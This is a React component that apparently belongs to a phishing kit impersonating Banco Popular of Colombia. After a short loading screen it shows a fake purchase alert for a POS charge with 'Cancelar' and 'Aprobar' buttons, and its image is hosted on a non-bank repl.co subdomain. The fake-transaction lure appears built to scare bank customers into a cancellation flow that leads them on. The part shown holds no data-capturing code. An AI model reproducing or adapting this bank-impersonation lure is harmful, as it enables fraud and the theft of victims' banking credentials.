import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import Cargando from './Cargando'

const Final = () => {

  const navigate = useNavigate()
  const [load, setLoad] = useState(true)

  setTimeout(() => {
    setLoad(false)
  }, 1500);

  const cancelar = () => {
    navigate('/cancelacion-exitosa')
  }

  if(load){
    return <Cargando />
  }else {
    return (
      <div className='contraseña'>
  
          <section>
  
          <div className="texto-contraseña">
              <div className="img-contra">
                <img src="https://ventas.popularcomproba.repl.co/password.png" alt="" />
              </div>
              <h1>Atención</h1>
            </div>
  
            <p className='msj-compra' >Banco Popular. COMPRA EN POS ASCREDIBANCO ALMACEN FACOL CALI COLCO por $253.120 CTA *XX 03/03/2023 Para mayor información ingrese al portal www.bancopopular.com.co</p>
              
              <button onClick={cancelar} className='cancelar'>Cancelar</button>
              <button className='aprobar'>Aprobar</button>
          </section>
          
      </div>
    )
  }
}

export default Final